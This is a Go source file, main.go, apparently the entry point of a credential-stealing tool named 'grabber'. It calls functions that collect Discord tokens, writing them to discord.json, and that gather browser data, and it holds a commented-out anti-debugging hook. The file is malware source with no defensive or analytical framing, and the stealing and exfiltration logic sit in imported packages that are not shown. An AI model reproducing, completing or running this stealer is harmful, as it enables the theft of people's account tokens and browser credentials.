// main.go
package main

import (
	"fmt"
	"kdot/grabber/browsers"
	"kdot/grabber/discord"
	"os"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

func main() {
	startTime := time.Now()
	//go anti.AntiDebug()
	os.WriteFile("discord.json", []byte(discord.GetTokens()), 0644)
	browsers.GetBrowserData()
	fmt.Println("Time elapsed: ", time.Since(startTime))
	os.Exit(0)
}
